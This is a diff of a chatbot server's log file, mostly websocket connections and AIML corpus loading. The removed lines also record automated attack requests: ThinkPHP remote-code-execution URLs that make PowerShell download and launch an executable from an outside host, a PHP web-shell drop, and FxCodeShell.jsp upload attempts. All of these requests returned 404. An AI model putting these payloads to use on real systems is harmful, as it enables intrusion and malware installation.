@@ -1,90 +1,72 @@
 
-Not Found: /FxCodeShell.jsp 
-2019-04-04 17:27:09,242 WARNING  Not Found: /FxCodeShell.jsp 
-Not Found: /FxCodeShell.jsp::$DATA
-2019-04-04 17:27:09,256 WARNING  Not Found: /FxCodeShell.jsp::$DATA
-Not Found: /FxCodeShell.jsp/
-2019-04-04 17:27:09,269 WARNING  Not Found: /FxCodeShell.jsp/
-Not Found: /FxCodeShell.jsp
-2019-04-04 17:27:09,285 WARNING  Not Found: /FxCodeShell.jsp
-Not Found: /FxCodeShell.jsp 
-2019-04-04 20:53:11,259 WARNING  Not Found: /FxCodeShell.jsp 
-Not Found: /FxCodeShell.jsp::$DATA
-2019-04-04 20:53:11,271 WARNING  Not Found: /FxCodeShell.jsp::$DATA
-Not Found: /FxCodeShell.jsp/
-2019-04-04 20:53:11,280 WARNING  Not Found: /FxCodeShell.jsp/
-Not Found: /FxCodeShell.jsp
-2019-04-04 20:53:11,289 WARNING  Not Found: /FxCodeShell.jsp
-112.10.183.32:2547 - - [31/Mar/2019:10:07:41] "WSDISCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2580 - - [31/Mar/2019:10:07:45] "WSCONNECTING /ws/chat/YS19032700/" - -
-112.10.183.32:2580 - - [31/Mar/2019:10:07:45] "WSCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2580 - - [31/Mar/2019:10:07:48] "WSDISCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2585 - - [31/Mar/2019:10:07:48] "WSCONNECTING /ws/chat/YS19032700/" - -
-112.10.183.32:2585 - - [31/Mar/2019:10:07:48] "WSCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2585 - - [31/Mar/2019:10:10:35] "WSDISCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2691 - - [31/Mar/2019:10:10:36] "WSCONNECTING /ws/chat/YS19032700/" - -
-112.10.183.32:2691 - - [31/Mar/2019:10:10:36] "WSCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2691 - - [31/Mar/2019:10:10:41] "WSDISCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2696 - - [31/Mar/2019:10:10:44] "WSCONNECTING /ws/chat/YS19032700/" - -
-112.10.183.32:2696 - - [31/Mar/2019:10:10:44] "WSCONNECT /ws/chat/YS19032700/" - -
-112.10.183.32:2696 - - [31/Mar/2019:15:12:08] "WSDISCONNECT /ws/chat/YS19032700/" - -
-119.29.157.60:26355 - - [31/Mar/2019:18:16:55] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/boyllruutxbktbd13449.exe');start%20C:/Windows/temp/boyllruutxbktbd13449.exe" 404 9492
-119.29.157.60:26355 - - [31/Mar/2019:18:16:55] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 9365
-119.29.157.60:26355 - - [31/Mar/2019:18:16:55] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/boyllruutxbktbd13449.exe');start%20C:/Windows/temp/boyllruutxbktbd13449.exe" 404 9395
-119.29.163.219:52647 - - [31/Mar/2019:21:19:56] "PUT /FxCodeShell.jsp%20" 404 9169
-119.29.163.219:52647 - - [31/Mar/2019:21:19:56] "PUT /FxCodeShell.jsp::$DATA" 404 9185
-119.29.163.219:52647 - - [31/Mar/2019:21:19:56] "PUT /FxCodeShell.jsp/" 404 9167
-119.29.163.219:52647 - - [31/Mar/2019:21:19:56] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 9244
-119.29.163.219:59620 - - [01/Apr/2019:20:09:40] "GET /struts2-rest-showcase/orders.xhtml" 404 9221
-119.29.163.219:59620 - - [01/Apr/2019:20:09:40] "GET /index.action" 404 9155
-119.29.163.219:59620 - - [01/Apr/2019:20:09:40] "GET /index.do" 404 9143
-139.162.79.87:52114 - - [01/Apr/2019:21:56:53] "GET /" 200 12678
-119.29.157.60:26947 - - [02/Apr/2019:03:24:33] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/boyllruutxbktbd13449.exe');start%20C:/Windows/temp/boyllruutxbktbd13449.exe" 404 9492
-119.29.157.60:26947 - - [02/Apr/2019:03:24:33] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 9365
-119.29.157.60:26947 - - [02/Apr/2019:03:24:33] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/boyllruutxbktbd13449.exe');start%20C:/Windows/temp/boyllruutxbktbd13449.exe" 404 9395
-119.29.176.243:50422 - - [02/Apr/2019:12:42:39] "GET /struts2-rest-showcase/orders.xhtml" 404 9221
-119.29.176.243:50422 - - [02/Apr/2019:12:42:39] "GET /index.action" 404 9155
-119.29.176.243:50422 - - [02/Apr/2019:12:42:39] "GET /index.do" 404 9143
-119.29.163.219:64670 - - [03/Apr/2019:02:39:48] "GET /struts2-rest-showcase/orders.xhtml" 404 9221
-119.29.163.219:64670 - - [03/Apr/2019:02:39:48] "GET /index.action" 404 9155
-119.29.163.219:64670 - - [03/Apr/2019:02:39:48] "GET /index.do" 404 9143
-119.29.163.219:56251 - - [03/Apr/2019:03:55:31] "PUT /FxCodeShell.jsp%20" 404 9169
-119.29.163.219:56251 - - [03/Apr/2019:03:55:31] "PUT /FxCodeShell.jsp::$DATA" 404 9185
-119.29.163.219:56251 - - [03/Apr/2019:03:55:31] "PUT /FxCodeShell.jsp/" 404 9167
-119.29.163.219:56251 - - [03/Apr/2019:03:55:31] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 9244
-119.29.163.219:61902 - - [03/Apr/2019:12:29:59] "GET /struts2-rest-showcase/orders.xhtml" 404 9221
-119.29.163.219:61902 - - [03/Apr/2019:12:29:59] "GET /index.action" 404 9155
-119.29.163.219:61902 - - [03/Apr/2019:12:29:59] "GET /index.do" 404 9143
-119.29.163.219:63482 - - [03/Apr/2019:13:44:53] "PUT /FxCodeShell.jsp%20" 404 9169
-119.29.163.219:63482 - - [03/Apr/2019:13:44:53] "PUT /FxCodeShell.jsp::$DATA" 404 9185
-119.29.163.219:63482 - - [03/Apr/2019:13:44:53] "PUT /FxCodeShell.jsp/" 404 9167
-119.29.163.219:63482 - - [03/Apr/2019:13:44:53] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 9244
-119.29.163.219:55962 - - [03/Apr/2019:17:18:13] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/chvyhyqvogtuugs22183.exe');start%20C:/Windows/temp/chvyhyqvogtuugs22183.exe" 404 9492
-119.29.163.219:55962 - - [03/Apr/2019:17:18:13] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 9365
-119.29.163.219:55962 - - [03/Apr/2019:17:18:13] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/chvyhyqvogtuugs22183.exe');start%20C:/Windows/temp/chvyhyqvogtuugs22183.exe" 404 9395
-119.29.163.219:54773 - - [04/Apr/2019:17:27:09] "PUT /FxCodeShell.jsp%20" 404 9169
-119.29.163.219:54773 - - [04/Apr/2019:17:27:09] "PUT /FxCodeShell.jsp::$DATA" 404 9185
-119.29.163.219:54773 - - [04/Apr/2019:17:27:09] "PUT /FxCodeShell.jsp/" 404 9167
-119.29.163.219:54773 - - [04/Apr/2019:17:27:09] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 9244
-119.29.157.60:7717 - - [04/Apr/2019:20:53:11] "PUT /FxCodeShell.jsp%20" 404 9169
-119.29.157.60:7717 - - [04/Apr/2019:20:53:11] "PUT /FxCodeShell.jsp::$DATA" 404 9185
-119.29.157.60:7717 - - [04/Apr/2019:20:53:11] "PUT /FxCodeShell.jsp/" 404 9167
-119.29.157.60:7717 - - [04/Apr/2019:20:53:11] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=" 404 9210
-198.108.67.48:22468 - - [05/Apr/2019:04:29:48] "GET /" 200 12678
-124.160.57.70:49371 - - [05/Apr/2019:05:30:42] "WSCONNECTING /robot/528540.350007729220311/" - -
-124.160.57.70:49371 - - [05/Apr/2019:05:30:42] "WSCONNECT /robot/528540.350007729220311/" - -
-Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+124.160.57.70:65429 - - [06/Apr/2019:15:34:55] "WSCONNECTING /ws/chat/YS19032700/" - -
+124.160.57.70:65429 - - [06/Apr/2019:15:34:55] "WSCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:65429 - - [06/Apr/2019:15:35:36] "WSDISCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:1060 - - [06/Apr/2019:15:35:36] "WSCONNECTING /ws/chat/YS19032700/" - -
+124.160.57.70:1060 - - [06/Apr/2019:15:35:36] "WSCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:64620 - - [06/Apr/2019:15:36:14] "WSDISCONNECT /ws/chat/1/" - -
+124.160.57.70:1160 - - [06/Apr/2019:15:36:14] "WSCONNECTING /ws/chat/1/" - -
+124.160.57.70:1160 - - [06/Apr/2019:15:36:14] "WSCONNECT /ws/chat/1/" - -
+124.160.57.70:1060 - - [06/Apr/2019:15:36:38] "WSDISCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:1219 - - [06/Apr/2019:15:36:39] "WSCONNECTING /ws/chat/YS19032701/" - -
+124.160.57.70:1219 - - [06/Apr/2019:15:36:39] "WSCONNECT /ws/chat/YS19032701/" - -
+124.160.57.70:1219 - - [06/Apr/2019:15:39:31] "WSDISCONNECT /ws/chat/YS19032701/" - -
+124.160.57.70:1768 - - [06/Apr/2019:15:39:31] "WSCONNECTING /ws/chat/YS19032701/" - -
+124.160.57.70:1768 - - [06/Apr/2019:15:39:31] "WSCONNECT /ws/chat/YS19032701/" - -
+124.160.57.70:1768 - - [06/Apr/2019:15:41:28] "WSDISCONNECT /ws/chat/YS19032701/" - -
+124.160.57.70:2069 - - [06/Apr/2019:15:41:29] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:2069 - - [06/Apr/2019:15:41:29] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2069 - - [06/Apr/2019:15:42:22] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2208 - - [06/Apr/2019:15:42:22] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:2208 - - [06/Apr/2019:15:42:22] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2208 - - [06/Apr/2019:15:42:24] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2212 - - [06/Apr/2019:15:42:24] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:2212 - - [06/Apr/2019:15:42:24] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2212 - - [06/Apr/2019:15:43:33] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2500 - - [06/Apr/2019:15:43:34] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:2500 - - [06/Apr/2019:15:43:34] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2500 - - [06/Apr/2019:15:44:59] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2753 - - [06/Apr/2019:15:45:00] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:2753 - - [06/Apr/2019:15:45:00] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2753 - - [06/Apr/2019:15:45:01] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2759 - - [06/Apr/2019:15:45:01] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:2759 - - [06/Apr/2019:15:45:01] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:2759 - - [06/Apr/2019:15:48:09] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:3265 - - [06/Apr/2019:15:48:10] "WSCONNECTING /ws/chat/YS19032703/" - -
+124.160.57.70:3265 - - [06/Apr/2019:15:48:10] "WSCONNECT /ws/chat/YS19032703/" - -
+124.160.57.70:3265 - - [06/Apr/2019:15:48:13] "WSDISCONNECT /ws/chat/YS19032703/" - -
+124.160.57.70:3277 - - [06/Apr/2019:15:48:14] "WSCONNECTING /ws/chat/YS19032704/" - -
+124.160.57.70:3277 - - [06/Apr/2019:15:48:14] "WSCONNECT /ws/chat/YS19032704/" - -
+124.160.57.70:3277 - - [06/Apr/2019:15:48:21] "WSDISCONNECT /ws/chat/YS19032704/" - -
+124.160.57.70:3294 - - [06/Apr/2019:15:48:21] "WSCONNECTING /ws/chat/YS19032705/" - -
+124.160.57.70:3294 - - [06/Apr/2019:15:48:21] "WSCONNECT /ws/chat/YS19032705/" - -
+124.160.57.70:3294 - - [06/Apr/2019:15:48:27] "WSDISCONNECT /ws/chat/YS19032705/" - -
+124.160.57.70:3320 - - [06/Apr/2019:15:48:31] "WSCONNECTING /ws/chat/YS19032704/" - -
+124.160.57.70:3320 - - [06/Apr/2019:15:48:31] "WSCONNECT /ws/chat/YS19032704/" - -
+124.160.57.70:3320 - - [06/Apr/2019:15:50:46] "WSDISCONNECT /ws/chat/YS19032704/" - -
+124.160.57.70:3688 - - [06/Apr/2019:15:50:49] "WSCONNECTING /ws/chat/YS19032704/" - -
+124.160.57.70:3688 - - [06/Apr/2019:15:50:49] "WSCONNECT /ws/chat/YS19032704/" - -
+124.160.57.70:3688 - - [06/Apr/2019:16:02:59] "WSDISCONNECT /ws/chat/YS19032704/" - -
+124.160.57.70:6333 - - [06/Apr/2019:16:03:07] "WSCONNECTING /ws/chat/YS19032700/" - -
+124.160.57.70:6333 - - [06/Apr/2019:16:03:07] "WSCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:6333 - - [06/Apr/2019:16:03:11] "WSDISCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:6350 - - [06/Apr/2019:16:03:11] "WSCONNECTING /ws/chat/YS19032701/" - -
+124.160.57.70:6350 - - [06/Apr/2019:16:03:11] "WSCONNECT /ws/chat/YS19032701/" - -
+124.160.57.70:6350 - - [06/Apr/2019:16:03:14] "WSDISCONNECT /ws/chat/YS19032701/" - -
+124.160.57.70:6356 - - [06/Apr/2019:16:03:14] "WSCONNECTING /ws/chat/YS19032702/" - -
+124.160.57.70:6356 - - [06/Apr/2019:16:03:14] "WSCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:6356 - - [06/Apr/2019:16:03:18] "WSDISCONNECT /ws/chat/YS19032702/" - -
+124.160.57.70:6376 - - [06/Apr/2019:16:03:18] "WSCONNECTING /ws/chat/YS19032703/" - -
+124.160.57.70:6376 - - [06/Apr/2019:16:03:18] "WSCONNECT /ws/chat/YS19032703/" - -
+124.160.57.70:6376 - - [06/Apr/2019:16:03:21] "WSDISCONNECT /ws/chat/YS19032703/" - -
+124.160.57.70:6448 - - [06/Apr/2019:16:03:50] "WSCONNECTING /ws/chat/YS19032700/" - -
+124.160.57.70:6448 - - [06/Apr/2019:16:03:50] "WSCONNECT /ws/chat/YS19032700/" - -
+124.160.57.70:1160 - - [06/Apr/2019:16:03:56] "WSDISCONNECT /ws/chat/1/" - -
+124.160.57.70:6473 - - [06/Apr/2019:16:03:58] "WSCONNECTING /ws/chat/1/" - -
+124.160.57.70:6473 - - [06/Apr/2019:16:03:58] "WSCONNECT /ws/chat/1/" - -
+124.160.57.70:6473 - - [06/Apr/2019:16:04:28] "WSDISCONNECT /ws/chat/1/" - -
+124.160.57.70:7895 - - [06/Apr/2019:16:12:10] "WSCONNECTING /robot/1/" - -
+124.160.57.70:7895 - - [06/Apr/2019:16:12:10] "WSCONNECT /robot/1/" - -
 Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
@@ -107,117 +89,13 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
-Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-124.160.57.70:49371 - - [05/Apr/2019:05:30:54] "WSDISCONNECT /robot/528540.350007729220311/" - -
-124.160.57.70:49483 - - [05/Apr/2019:05:31:38] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:49483 - - [05/Apr/2019:05:31:38] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:49483 - - [05/Apr/2019:05:39:00] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50390 - - [05/Apr/2019:05:39:01] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50390 - - [05/Apr/2019:05:39:01] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50390 - - [05/Apr/2019:05:41:14] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50633 - - [05/Apr/2019:05:41:14] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50633 - - [05/Apr/2019:05:41:14] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50633 - - [05/Apr/2019:05:41:15] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50640 - - [05/Apr/2019:05:41:16] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50640 - - [05/Apr/2019:05:41:16] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50640 - - [05/Apr/2019:05:41:16] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50644 - - [05/Apr/2019:05:41:16] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50644 - - [05/Apr/2019:05:41:17] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50644 - - [05/Apr/2019:05:41:18] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50655 - - [05/Apr/2019:05:41:19] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50655 - - [05/Apr/2019:05:41:19] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50655 - - [05/Apr/2019:05:41:38] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50689 - - [05/Apr/2019:05:41:42] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50689 - - [05/Apr/2019:05:41:42] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50689 - - [05/Apr/2019:05:42:39] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50793 - - [05/Apr/2019:05:42:39] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50793 - - [05/Apr/2019:05:42:39] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50793 - - [05/Apr/2019:05:43:15] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51004 - - [05/Apr/2019:05:43:18] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51004 - - [05/Apr/2019:05:43:18] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51004 - - [05/Apr/2019:05:43:21] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50743 - - [05/Apr/2019:05:43:21] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:50743 - - [05/Apr/2019:05:43:21] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:50743 - - [05/Apr/2019:05:47:19] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51375 - - [05/Apr/2019:05:47:19] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51375 - - [05/Apr/2019:05:47:19] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51375 - - [05/Apr/2019:05:48:16] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51461 - - [05/Apr/2019:05:48:16] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51461 - - [05/Apr/2019:05:48:16] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51461 - - [05/Apr/2019:05:49:22] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51558 - - [05/Apr/2019:05:49:22] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51558 - - [05/Apr/2019:05:49:22] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51558 - - [05/Apr/2019:05:49:56] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51849 - - [05/Apr/2019:05:49:56] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51849 - - [05/Apr/2019:05:49:56] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51849 - - [05/Apr/2019:05:50:56] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52113 - - [05/Apr/2019:05:50:56] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52113 - - [05/Apr/2019:05:50:56] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52113 - - [05/Apr/2019:05:51:07] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52159 - - [05/Apr/2019:05:51:07] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52159 - - [05/Apr/2019:05:51:07] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52159 - - [05/Apr/2019:05:51:43] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52286 - - [05/Apr/2019:05:51:43] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52286 - - [05/Apr/2019:05:51:43] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52286 - - [05/Apr/2019:05:52:11] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52349 - - [05/Apr/2019:05:52:12] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52349 - - [05/Apr/2019:05:52:12] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52349 - - [05/Apr/2019:05:52:25] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52373 - - [05/Apr/2019:05:52:25] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52373 - - [05/Apr/2019:05:52:25] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52373 - - [05/Apr/2019:05:52:42] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51908 - - [05/Apr/2019:05:52:42] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51908 - - [05/Apr/2019:05:52:42] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51908 - - [05/Apr/2019:05:52:48] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51914 - - [05/Apr/2019:05:52:49] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51914 - - [05/Apr/2019:05:52:49] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51914 - - [05/Apr/2019:05:52:56] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52433 - - [05/Apr/2019:05:52:56] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52433 - - [05/Apr/2019:05:52:56] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52433 - - [05/Apr/2019:05:53:22] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51964 - - [05/Apr/2019:05:53:22] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:51964 - - [05/Apr/2019:05:53:22] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:51964 - - [05/Apr/2019:05:55:37] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52728 - - [05/Apr/2019:05:55:37] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52728 - - [05/Apr/2019:05:55:37] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52728 - - [05/Apr/2019:05:55:52] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52742 - - [05/Apr/2019:05:55:52] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52742 - - [05/Apr/2019:05:55:52] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52742 - - [05/Apr/2019:05:56:15] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52772 - - [05/Apr/2019:05:56:15] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:52772 - - [05/Apr/2019:05:56:15] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:52772 - - [05/Apr/2019:06:01:30] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:53170 - - [05/Apr/2019:06:01:30] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:53170 - - [05/Apr/2019:06:01:30] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:53170 - - [05/Apr/2019:06:02:30] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:53457 - - [05/Apr/2019:06:02:53] "WSCONNECTING /ws/chat/1/" - -
-124.160.57.70:53457 - - [05/Apr/2019:06:02:53] "WSCONNECT /ws/chat/1/" - -
-124.160.57.70:53457 - - [05/Apr/2019:06:27:44] "WSDISCONNECT /ws/chat/1/" - -
-124.160.57.70:56305 - - [05/Apr/2019:06:28:33] "WSCONNECTING /ws/chat/1/" - -
-124.160.57.70:56305 - - [05/Apr/2019:06:28:33] "WSCONNECT /ws/chat/1/" - -
-124.160.57.70:56305 - - [05/Apr/2019:06:29:15] "WSDISCONNECT /ws/chat/1/" - -
-124.160.57.70:56456 - - [05/Apr/2019:06:29:23] "WSCONNECTING /ws/chat/1/" - -
-124.160.57.70:56456 - - [05/Apr/2019:06:29:23] "WSCONNECT /ws/chat/1/" - -
-124.160.57.70:56699 - - [05/Apr/2019:06:31:17] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:56699 - - [05/Apr/2019:06:31:17] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:56456 - - [05/Apr/2019:06:32:51] "WSDISCONNECT /ws/chat/1/" - -
-124.160.57.70:56699 - - [05/Apr/2019:06:32:51] "WSDISCONNECT /ws/chat/YS19032700/" - -
-2019-04-05 06:32:53,537 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-04-05 06:32:53,538 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-04-05 06:32:53,538 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-04-05 06:32:53,539 INFO     Listening on TCP address 0.0.0.0:8001
